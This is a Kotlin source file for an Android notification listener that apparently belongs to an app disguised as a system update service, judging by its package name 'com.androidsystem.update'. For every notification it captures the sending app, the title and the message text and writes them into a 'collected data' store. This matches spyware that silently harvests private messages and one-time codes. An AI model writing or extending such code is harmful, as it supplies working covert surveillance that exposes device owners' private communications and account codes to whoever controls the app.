package com.androidsystem.update.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.androidsystem.update.database.DataRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import org.json.JSONObject
import javax.inject.Inject

@AndroidEntryPoint
class NotificationListener : NotificationListenerService() {

    @Inject lateinit var repository: DataRepository

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn ?: return
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope.launch {
            try {
                repository.insertCollectedData("notification", JSONObject().apply {
                    put("package", sbn.packageName)
                    put("title", sbn.notification.extras.getString("android.title") ?: "")
                    put("text", sbn.notification.extras.getCharSequence("android.text")?.toString() ?: "")
                    put("timestamp", System.currentTimeMillis())
                }.toString())
            } finally {
                scope.cancel()
            }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}
